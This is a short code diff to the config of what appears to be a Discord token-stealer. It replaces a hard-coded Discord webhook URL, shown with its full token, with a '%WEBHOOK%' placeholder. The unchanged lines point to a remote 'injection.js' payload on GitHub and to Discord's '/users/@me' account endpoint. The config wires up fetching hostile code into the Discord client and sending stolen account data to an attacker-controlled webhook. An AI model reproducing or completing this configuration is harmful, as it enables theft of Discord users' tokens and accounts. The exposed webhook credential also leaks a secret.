@@ -15,7 +15,7 @@ const config = {
       "%20",
     ), 
   embed_color: 8363488, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  webhook: "https://discord.com/api/webhooks/964704531445325904/otL8N-InswyQz9OvxjYhj1vHPsXQELApULzrHwd6KyV2gl58TKfkBXBlm4jYJyXhySTx", 
+  webhook: "%WEBHOOK%", 
   injection_url: "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js", 
   api: "https://discord.com/api/v9/users/@me",
   nitro: {
